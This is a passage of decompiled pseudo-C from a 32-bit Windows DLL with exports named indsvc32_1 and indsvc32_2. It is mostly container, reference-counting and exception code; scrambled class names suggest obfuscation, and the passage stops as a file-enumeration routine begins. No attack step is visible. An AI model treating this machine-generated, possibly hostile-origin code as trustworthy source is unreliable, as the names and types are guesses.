      if ( v7 )
      {
        if ( *((_DWORD *)v7 - 1) )
          (**(void (__thiscall ***)(char *, int))v7)(v7, 3);
        else
          j__free(v7 - 4);
      }
      result = (void *)v14;
      this[2] = v14;
    }
  }
  return result;
}

//----- (100077CD) --------------------------------------------------------
_DWORD *__usercall sub_100077CD@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}

//----- (1000780D) --------------------------------------------------------
void __thiscall sub_1000780D(void *this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_100081D1((int)this);
}

//----- (10007846) --------------------------------------------------------
void __stdcall sub_10007846(int a1)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10008269(a1);
}

//----- (10007882) --------------------------------------------------------
void __cdecl __noreturn sub_10007882(int pExceptionObject)
{
  sub_1000E7B3(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
}

//----- (100078A2) --------------------------------------------------------
void __thiscall sub_100078A2(void **this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    if ( *this )
      (*(void (__thiscall **)(void *, int))(*(_DWORD *)*this + 40))(*this, 1);
  }
}

//----- (100078FE) --------------------------------------------------------
void __cdecl __noreturn sub_100078FE(int pExceptionObject)
{
  sub_10007F6E(&pExceptionObject, pExceptionObject);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
}

//----- (1000791E) --------------------------------------------------------
_DWORD *__userpurge sub_1000791E@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  sub_1000A901(a2);
  *a2 = &off_100FC020;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10007C67(a2, v2, v4, v5);
  return a2;
}
// 100FC020: using guessed type int (__thiscall *off_100FC020)(void *Block, char);

//----- (10007972) --------------------------------------------------------
_DWORD *__stdcall sub_10007972(_DWORD *a1)
{
  sub_1000A901(a1);
  *a1 = &off_100FC020;
  sub_10008295(16, a1);
  return a1;
}
// 100FC020: using guessed type int (__thiscall *off_100FC020)(void *Block, char);

//----- (100079AD) --------------------------------------------------------
void **__thiscall sub_100079AD(void **this, void **a2)
{
  void (__thiscall **v3)(void **, int); // ebx
  int v4; // eax
  int v5; // eax

  if ( a2 != this )
  {
    j__free(this[3]);
    v3 = (void (__thiscall **)(void **, int))*this;
    this[2] = (void *)1;
    v4 = (*((int (__thiscall **)(void **))*a2 + 1))(a2);
    v5 = (*((int (__thiscall **)(void **, void *, int))*a2 + 1))(a2, a2[3], v4);
    v3[21](this, v5);
  }
  return this;
}

//----- (100079EC) --------------------------------------------------------
void *__thiscall sub_100079EC(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_100FC020;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100059B5((_DWORD *)this);
}
// 100FC020: using guessed type int (__thiscall *off_100FC020)(void *Block, char);

//----- (10007A4A) --------------------------------------------------------
int __thiscall sub_10007A4A(_DWORD *this)
{
  return this[1];
}

//----- (10007A4E) --------------------------------------------------------
int __thiscall sub_10007A4E(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_10144F5E);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (10007AB1) --------------------------------------------------------
int __thiscall sub_10007AB1(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10144F5F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (10007AFA) --------------------------------------------------------
int __thiscall sub_10007AFA(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014512A);
  return this[3] + 4 * a2;
}

//----- (10007B18) --------------------------------------------------------
int __thiscall sub_10007B18(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_1014512B);
  return this[3] + 4 * a2;
}

//----- (10007B36) --------------------------------------------------------
void __thiscall sub_10007B36(_DWORD *this, unsigned int a2)
{
  void *v2; // esi

  if ( this[2] < a2 )
  {
    v2 = (void *)this[3];
    (*(void (__thiscall **)(_DWORD *, _DWORD, void *, unsigned int))(*this + 84))(this, this[1], v2, a2);
    j__free(v2);
  }
}

//----- (10007B58) --------------------------------------------------------
int __thiscall sub_10007B58(void **this)
{
  void *v2; // edx
  int result; // eax

  j__free(this[3]);
  v2 = *this;
  this[2] = (void *)1;
  result = (*((int (__thiscall **)(void **, _DWORD, _DWORD, int))v2 + 21))(this, 0, 0, 1);
  this[1] = 0;
  return result;
}

//----- (10007B7C) --------------------------------------------------------
int __thiscall sub_10007B7C(_DWORD *this, unsigned int a2)
{
  unsigned int i; // edi
  int v4; // eax

  for ( i = a2; i < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); ++i )
    *(_DWORD *)(this[3] + 4 * i) = 0;
  (*(void (__thiscall **)(_DWORD *, unsigned int))(*this + 60))(this, a2);
  v4 = *this;
  this[1] = a2;
  return (*(int (__thiscall **)(_DWORD *))(v4 + 88))(this);
}

//----- (10007BBB) --------------------------------------------------------
unsigned int __thiscall sub_10007BBB(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_10145162);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (10007C2D) --------------------------------------------------------
unsigned int __thiscall sub_10007C2D(void *this, unsigned int a2, int a3)
{
  unsigned int result; // eax
  _DWORD *v4; // eax

  result = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a2 >= result )
  {
    v4 = sub_1000E8EF(&a2);
    sub_100078FE((int)v4);
  }
  return result;
}

//----- (10007C67) --------------------------------------------------------
unsigned int __thiscall sub_10007C67(_DWORD *this, int a2, int a3, int a4)
{
  int v5; // eax
  unsigned int v6; // edi
  unsigned int result; // eax

  v5 = (*(int (__thiscall **)(_DWORD *, _DWORD, int))(*this + 80))(this, this[2], a4);
  this[2] = v5;
  this[3] = operator new(4 * v5);
  this[1] = a2;
  v6 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      *(_DWORD *)(this[3] + 4 * v6) = *(_DWORD *)(a3 + 4 * v6);
      ++v6;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v6 < result );
  }
  return result;
}

//----- (10007CC4) --------------------------------------------------------
void __thiscall sub_10007CC4(_DWORD *this)
{
  int v2; // edi
  int v3; // eax
  int v4; // edi
  int v5; // eax
  void *v6; // ebx
  _DWORD *v7; // edi
  int v8; // ebx
  void *Block; // [esp+8h] [ebp-10h]
  _DWORD *v10; // [esp+Ch] [ebp-Ch]
  int v11; // [esp+10h] [ebp-8h]
  unsigned int v12; // [esp+14h] [ebp-4h]

  if ( this[2] > 0x10u && (unsigned int)(2 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) <= this[2] )
  {
    v2 = *this;
    v3 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( (unsigned int)(*(int (__thiscall **)(_DWORD *, int, int))(v2 + 80))(this, 1, v3) <= 0x10 )
    {
      v11 = 16;
    }
    else
    {
      v4 = *this;
      v5 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
      v11 = (*(int (__thiscall **)(_DWORD *, int, int))(v4 + 80))(this, 1, v5);
    }
    v6 = (void *)this[3];
    Block = v6;
    v12 = 0;
    v7 = operator new(4 * v11);
    v10 = v7;
    if ( (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    {
      v8 = (_BYTE *)v6 - (_BYTE *)v7;
      do
      {
        ++v12;
        *v7 = *(_DWORD *)((char *)v7 + v8);
        ++v7;
      }
      while ( v12 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) );
    }
    this[3] = v10;
    j__free(Block);
    this[2] = v11;
  }
}

//----- (10007D7A) --------------------------------------------------------
void __thiscall sub_10007D7A(void **this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    if ( *this )
      (**(void (__thiscall ***)(void *, int))*this)(*this, 1);
  }
}

//----- (10007DD5) --------------------------------------------------------
void __cdecl __noreturn sub_10007DD5(int a1, int a2)
{
  _DWORD pExceptionObject[2]; // [esp+0h] [ebp-8h] BYREF

  sub_10007FC2(pExceptionObject, a1, 1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
}
// 10007DD5: using guessed type _DWORD pExceptionObject[2];

//----- (10007DF9) --------------------------------------------------------
_DWORD *__thiscall sub_10007DF9(_DWORD *Block, char a2)
{
  sub_100068A5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007E15) --------------------------------------------------------
void __thiscall sub_10007E15(_DWORD *this)
{
  sub_1000D17D(this, &word_1017DB80);
}

//----- (10007E21) --------------------------------------------------------
_DWORD *__thiscall sub_10007E21(_DWORD *Block, char a2)
{
  sub_10006DC3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007E3D) --------------------------------------------------------
char *__usercall sub_10007E3D@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0x20u, *((_DWORD *)a1 - 1), (void (__thiscall *)(void *))sub_10003111);
  j__free(v1);
  return v1;
}

//----- (10007E5B) --------------------------------------------------------
LONG *__usercall sub_10007E5B@<eax>(int a1@<eax>, LONG *a2@<esi>)
{
  sub_10001236((LONG *)(a1 + 4), a2 + 1);
  sub_10001236((LONG *)(a1 + 12), a2 + 3);
  (*(void (__thiscall **)(LONG *, int))(a2[4] + 56))(a2 + 4, a1 + 16);
  return a2;
}

//----- (10007E84) --------------------------------------------------------
char *__thiscall sub_10007E84(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x10u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_1000522C);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_1000522C((int *)Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (10007ECD) --------------------------------------------------------
char *__usercall sub_10007ECD@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 0x20u, *((_DWORD *)a1 - 1), (void (__thiscall *)(void *))sub_1000646B);
  j__free(v1);
  return v1;
}

//----- (10007EEB) --------------------------------------------------------
_DWORD *__thiscall sub_10007EEB(_DWORD *Block, char a2)
{
  sub_1000730D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007F07) --------------------------------------------------------
char *__thiscall sub_10007F07(char *Block, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(Block, 0x10u, *((_DWORD *)Block - 1), (void (__thiscall *)(void *))sub_100057B7);
    if ( (a2 & 1) != 0 )
      j__free(Block - 4);
    return Block - 4;
  }
  else
  {
    sub_100057B7(Block);
    if ( (a2 & 1) != 0 )
      j__free(Block);
    return Block;
  }
}

//----- (10007F50) --------------------------------------------------------
char *__usercall sub_10007F50@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_1000780D);
  j__free(v1);
  return v1;
}

//----- (10007F6E) --------------------------------------------------------
_DWORD *__thiscall sub_10007F6E(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_100FBF4C;
  return this;
}
// 100FBF4C: using guessed type int (__thiscall *off_100FBF4C)(void *Block, char);

//----- (10007FA6) --------------------------------------------------------
void *__thiscall sub_10007FA6(void *Block, char a2)
{
  sub_100079EC((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10007FC2) --------------------------------------------------------
_DWORD *__thiscall sub_10007FC2(_DWORD *this, int a2, int a3)
{
  int v4; // eax

  if ( a3 )
  {
    *this = &unk_10102930;
    if ( a2 )
      v4 = a2 + *(_DWORD *)(*(_DWORD *)a2 + 4);
    else
      v4 = 0;
    sub_1000E7B3(this + 1, v4);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100FBF54;
  return this;
}
// 100FBF54: using guessed type int (__stdcall *off_100FBF54)(char);

//----- (1000802B) --------------------------------------------------------
_DWORD *__thiscall sub_1000802B(_DWORD *Block, char a2)
{
  sub_1000E927(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10008047) --------------------------------------------------------
char *__thiscall sub_10008047(_DWORD *this, char a2)
{
  char *v2; // esi

  v2 = (char *)(this - 1);
  sub_10006456(this - 1);
  if ( (a2 & 1) != 0 )
    j__free(v2);
  return v2;
}

//----- (10008066) --------------------------------------------------------
void __thiscall sub_10008066(_DWORD *this)
{
  *this = off_100FBFBC;
  sub_1000D17D(this + 1, &word_1017DB80);
}
// 100FBFBC: using guessed type int (__thiscall *off_100FBFBC[2])(void *, char);

//----- (1000809E) --------------------------------------------------------
_DWORD *__userpurge sub_1000809E@<eax>(_DWORD *a1@<esi>, _DWORD *a2)
{
  int v2; // eax
  int v4; // [esp-8h] [ebp-18h]
  int v5; // [esp-4h] [ebp-14h]

  sub_1000A901(a2);
  *a2 = &off_100FBF60;
  a2[2] = 1;
  v5 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  v4 = a1[3];
  v2 = (*(int (__thiscall **)(_DWORD *))(*a1 + 4))(a1);
  sub_10006B71(a2, v2, v4, v5);
  return a2;
}
// 100FBF60: using guessed type int (__thiscall *off_100FBF60)(void *Block, char);

//----- (100080F2) --------------------------------------------------------
void __usercall sub_100080F2(_DWORD *a1@<edi>, int a2@<esi>)
{
  _DWORD *v2; // ebx
  int v3; // ecx
  int *v4; // eax

  v2 = 0;
  a1[1] = 0;
  a1[2] = a2;
  v3 = (unsigned __int64)(unsigned int)a2 >> 29 != 0 ? -1 : 8 * a2;
  v4 = (int *)operator new(__CFADD__(v3, 4) ? -1 : v3 + 4);
  if ( v4 )
  {
    v2 = v4 + 1;
    *v4 = a2;
    `eh vector constructor iterator'(
      v4 + 1,
      8u,
      a2,
      (void (__thiscall *)(void *))sub_10007E15,
      (void (__thiscall *)(void *))sub_1000D3AD);
  }
  a1[3] = v2;
}

//----- (1000815F) --------------------------------------------------------
void __usercall sub_1000815F(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x204u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0x20u,
      16,
      (void (__thiscall *)(void *))sub_100030C4,
      (void (__thiscall *)(void *))sub_10003111);
  }
  a1[3] = v1;
}

//----- (100081D1) --------------------------------------------------------
void __usercall sub_100081D1(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100081F9) --------------------------------------------------------
void __usercall sub_100081F9(_DWORD *a1@<edi>)
{
  _DWORD *v1; // ebx
  _DWORD *v2; // eax

  v1 = 0;
  a1[1] = 0;
  a1[2] = 16;
  v2 = operator new(0x104u);
  if ( v2 )
  {
    v1 = v2 + 1;
    *v2 = 16;
    `eh vector constructor iterator'(
      v2 + 1,
      0x10u,
      16,
      (void (__thiscall *)(void *))sub_100066C2,
      (void (__thiscall *)(void *))sub_100057B7);
  }
  a1[3] = v1;
}

//----- (10008269) --------------------------------------------------------
void __usercall sub_10008269(int a1@<eax>)
{
  void **v2; // esi

  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    v2 = *(void ***)a1;
    if ( v2 )
      sub_100082B5(v2);
  }
}

//----- (10008295) --------------------------------------------------------
void *__usercall sub_10008295@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}

//----- (100082B5) --------------------------------------------------------
void **__stdcall sub_100082B5(void **Block)
{
  sub_1000780D(Block + 9);
  sub_10008301(Block + 7);
  sub_10005258(Block);
  j__free(Block);
  return Block;
}

//----- (10008301) --------------------------------------------------------
void __thiscall sub_10008301(void **this)
{
  _DWORD v1[7]; // [esp+0h] [ebp-1Ch] BYREF

  v1[3] = v1;
  v1[6] = 0;
  sub_10008338(this);
}

//----- (10008338) --------------------------------------------------------
void __thiscall sub_10008338(void **this)
{
  int *v2; // esi

  if ( !InterlockedDecrement((volatile LONG *)this[1]) )
  {
    if ( this[1] )
      j__free(this[1]);
    v2 = (int *)*this;
    if ( v2 )
    {
      sub_1000B3DF(v2 + 1);
      j__free(v2);
    }
  }
}

//----- (1000838A) --------------------------------------------------------
int __thiscall sub_1000838A(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int))(this[1] + 48))(this + 1, a2);
  return a2;
}

//----- (100083C0) --------------------------------------------------------
int __cdecl indsvc32_1(char *String, HANDLE hSourceHandle, int a3, _DWORD *a4, _DWORD *a5)
{
  int v5; // ecx
  int v6; // esi
  _DWORD v8[4]; // [esp-8h] [ebp-40h] BYREF
  _DWORD v9[2]; // [esp+8h] [ebp-30h] BYREF
  _DWORD v10[3]; // [esp+10h] [ebp-28h] BYREF
  void (__cdecl *v11[4])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+1Ch] [ebp-1Ch] BYREF
  int v12; // [esp+34h] [ebp-4h]

  sub_1000EB36(v9);
  v12 = 0;
  sub_1000EA57((int)v11);
  LOBYTE(v12) = 1;
  sub_1000EBF7(v10);
  LOBYTE(v12) = 2;
  sub_1000E73C();
  if ( a3 == 1 )
  {
    v8[1] = v5;
    v8[0] = v5;
    v8[3] = v8;
    sub_1000D3EB(v8, String);
    LOBYTE(v12) = 2;
    v6 = sub_10008B83(hSourceHandle, a4, a5);
  }
  else
  {
    v6 = 1;
  }
  LOBYTE(v12) = 1;
  sub_1000EC38(v10);
  LOBYTE(v12) = 0;
  sub_1000EA95(v11);
  v12 = -1;
  sub_1000EB6C(v9);
  return v6;
}
// 10008453: variable 'v5' is possibly undefined
// 100083C0: using guessed type _DWORD var_30[2];
// 100083C0: using guessed type void (__cdecl *var_1C[4])(unsigned int, struct _EXCEPTION_POINTERS *);
// 100083C0: using guessed type _DWORD var_28[3];

//----- (10008485) --------------------------------------------------------
int __cdecl indsvc32_2(void *a1, HANDLE hSourceHandle, int a3, _DWORD *a4, _DWORD *a5, void *a6)
{
  int v6; // esi
  _DWORD *v8; // eax
  int v9; // ecx
  _DWORD v10[5]; // [esp-8h] [ebp-58h] BYREF
  _DWORD v11[2]; // [esp+Ch] [ebp-44h] BYREF
  _DWORD v12[3]; // [esp+14h] [ebp-3Ch] BYREF
  void (__cdecl *v13[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+20h] [ebp-30h] BYREF
  int v14[6]; // [esp+2Ch] [ebp-24h] BYREF
  int v15; // [esp+4Ch] [ebp-4h]

  sub_1000EB36(v11);
  v15 = 0;
  sub_1000EA57((int)v13);
  LOBYTE(v15) = 1;
  sub_1000EBF7(v12);
  LOBYTE(v15) = 2;
  sub_1000E73C();
  if ( a3 == 2 )
  {
    v8 = (_DWORD *)sub_1000B1F3(a6, (int)v14, a1);
    LOBYTE(v15) = 3;
    v10[1] = v9;
    v10[0] = v9;
    v10[4] = v10;
    sub_1000D230(v8, v10);
    LOBYTE(v15) = 3;
    v6 = sub_10008B83(hSourceHandle, a4, a5);
    LOBYTE(v15) = 2;
    sub_1000B3DF(v14);
  }
  else
  {
    v6 = 1;
  }
  LOBYTE(v15) = 1;
  sub_1000EC38(v12);
  LOBYTE(v15) = 0;
  sub_1000EA95(v13);
  v15 = -1;
  sub_1000EB6C(v11);
  return v6;
}
// 1000852F: variable 'v9' is possibly undefined
// 10008485: using guessed type _DWORD var_44[2];
// 10008485: using guessed type void (__cdecl *var_30[3])(unsigned int, struct _EXCEPTION_POINTERS *);
// 10008485: using guessed type _DWORD var_3C[3];
// 10008485: using guessed type int var_24[6];

//----- (1000856F) --------------------------------------------------------
int __cdecl sub_1000856F(int a1, _DWORD *a2, size_t *a3)
{
  int v3; // esi
  const void *v5; // eax
  void *v6; // edx
  int v7[3]; // [esp-10h] [ebp-60h] BYREF
  size_t v8; // [esp-4h] [ebp-54h]
  int *v9; // [esp+8h] [ebp-48h]
  _DWORD v10[2]; // [esp+Ch] [ebp-44h] BYREF
  _DWORD v11[3]; // [esp+14h] [ebp-3Ch] BYREF
  void (__cdecl *v12[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+20h] [ebp-30h] BYREF
  int v13[3]; // [esp+2Ch] [ebp-24h] BYREF
  size_t Size; // [esp+38h] [ebp-18h]
  int v15; // [esp+4Ch] [ebp-4h]

  sub_1000EB36(v10);
  v15 = 0;
  sub_1000EA57((int)v12);
  LOBYTE(v15) = 1;
  sub_1000EBF7(v11);
  LOBYTE(v15) = 2;
  sub_1000E73C();
  if ( !byte_101842E0 )
  {
    *a3 = 0;
    v3 = 0;
LABEL_3:
    LOBYTE(v15) = 1;
    sub_1000EC38(v11);
    LOBYTE(v15) = 0;
    sub_1000EA95(v12);
    v15 = -1;
    sub_1000EB6C(v10);
    return v3;
  }
  if ( dword_101842F0 )
  {
    if ( dword_101842F0 != 1 )
    {
      LOBYTE(v15) = 1;
      sub_1000EC38(v11);
      LOBYTE(v15) = 0;
      sub_1000EA95(v12);
      v15 = -1;
      sub_1000EB6C(v10);
      return 1;
    }
    v9 = v7;
    sub_1000A23E(dword_10186844, v7);
    LOBYTE(v15) = 4;
  }
  else
  {
    v9 = v7;
    sub_1000A23E(dword_1018685C, v7);
    LOBYTE(v15) = 3;
  }
  LOBYTE(v15) = 2;
  if ( sub_100088B5(v7[0]) )
  {
    v3 = 1;
    goto LABEL_3;
  }
  sub_1000B1F3(0, (int)v13, 0);
  LOBYTE(v15) = 5;
  sub_1002FDF0(v13, dword_10186824);
  v8 = Size;
  *a3 = Size;
  *a2 = operator new(v8);
  v8 = *a3;
  v5 = (const void *)sub_1000B4B8(v13);
  memcpy(v6, v5, v8);
  byte_101842E0 = 0;
  LOBYTE(v15) = 2;
  sub_1000B3DF(v13);
  LOBYTE(v15) = 1;
  sub_1000EC38(v11);
  LOBYTE(v15) = 0;
  sub_1000EA95(v12);
  v15 = -1;
  sub_1000EB6C(v10);
  return 0;
}
// 1000869F: variable 'v6' is possibly undefined
// 101842E0: using guessed type char byte_101842E0;
// 101842F0: using guessed type int dword_101842F0;
// 10186824: using guessed type int dword_10186824;
// 10186844: using guessed type _DWORD dword_10186844[4];
// 1018685C: using guessed type _DWORD dword_1018685C[4];
// 1000856F: using guessed type _DWORD var_44[2];
// 1000856F: using guessed type void (__cdecl *var_30[3])(unsigned int, struct _EXCEPTION_POINTERS *);
// 1000856F: using guessed type _DWORD var_3C[3];
// 1000856F: using guessed type int var_24[3];

//----- (10008725) --------------------------------------------------------
int __cdecl sub_10008725(void *Block)
{
  void (__cdecl *v2[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+4h] [ebp-2Ch] BYREF
  _DWORD v3[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD v4[2]; // [esp+1Ch] [ebp-14h] BYREF
  int v5; // [esp+2Ch] [ebp-4h]

  sub_1000EB36(v4);
  v5 = 0;
  sub_1000EA57((int)v2);
  LOBYTE(v5) = 1;
  sub_1000EBF7(v3);
  LOBYTE(v5) = 2;
  sub_1000E73C();
  j_j__free(Block);
  LOBYTE(v5) = 1;
  sub_1000EC38(v3);
  LOBYTE(v5) = 0;
  sub_1000EA95(v2);
  v5 = -1;
  sub_1000EB6C(v4);
  return 0;
}
// 10008725: using guessed type _DWORD var_14[2];
// 10008725: using guessed type void (__cdecl *var_2C[3])(unsigned int, struct _EXCEPTION_POINTERS *);
// 10008725: using guessed type _DWORD var_20[3];

//----- (10008797) --------------------------------------------------------
int sub_10008797()
{
  void (__cdecl *v1[3])(unsigned int, struct _EXCEPTION_POINTERS *); // [esp+4h] [ebp-2Ch] BYREF
  _DWORD v2[3]; // [esp+10h] [ebp-20h] BYREF
  _DWORD v3[2]; // [esp+1Ch] [ebp-14h] BYREF
  int v4; // [esp+2Ch] [ebp-4h]

  sub_1000EB36(v3);
  v4 = 0;
  sub_1000EA57((int)v1);
  LOBYTE(v4) = 1;
  sub_1000EBF7(v2);
  LOBYTE(v4) = 2;
  sub_1000E73C();
  LOBYTE(v4) = 1;
  sub_1000EC38(v2);
  LOBYTE(v4) = 0;
  sub_1000EA95(v1);
  v4 = -1;
  sub_1000EB6C(v3);
  return 0;
}
// 10008797: using guessed type _DWORD var_14[2];
// 10008797: using guessed type void (__cdecl *var_2C[3])(unsigned int, struct _EXCEPTION_POINTERS *);
// 10008797: using guessed type _DWORD var_20[3];

//----- (10008800) --------------------------------------------------------
int *sub_10008800(int *a1, wchar_t a2, ...)
{
  int v2; // esi
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[2]; // [esp+10h] [ebp-20h] BYREF
  unsigned int v8; // [esp+18h] [ebp-18h]
  int v9; // [esp+1Ch] [ebp-14h]
  int v10; // [esp+2Ch] [ebp-4h]
  va_list va; // [esp+40h] [ebp+10h] BYREF

  va_start(va, a2);
  v10 = 1;
  sub_10006814(a1);
  v9 = 1;
  v2 = -1;
  while ( 1 )
  {
    v3 = v2;
    v8 = v2 + 1;
    v2 = sub_1000DE8B(v2 + 1, (int)va, a2);
    if ( v2 == -1 )
      break;
    v4 = sub_1000D836(v2 - v3 - 1, (int)va, v7, v8);
    LOBYTE(v10) = 2;
    sub_10007469(a1, (int)v4);
    LOBYTE(v10) = 1;
    sub_1000D3AD(v7);
  }
  v5 = sub_1000D836(-2, (int)va, v7, v3 + 1);
  LOBYTE(v10) = 3;
  sub_10007469(a1, (int)v5);
  LOBYTE(v10) = 1;
  sub_1000D3AD(v7);
  LOBYTE(v10) = 0;
  sub_1000D3AD((int *)va);
  return a1;
}

//----- (100088B5) --------------------------------------------------------
int __cdecl sub_100088B5(int a1)
{
  HANDLE FirstFileW; // eax
  int v2; // esi
  wchar_t *ExtensionW; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  _DWORD *v7; // eax
  int *v8; // eax
  _DWORD *v9; // esi
  void *v10; // esi
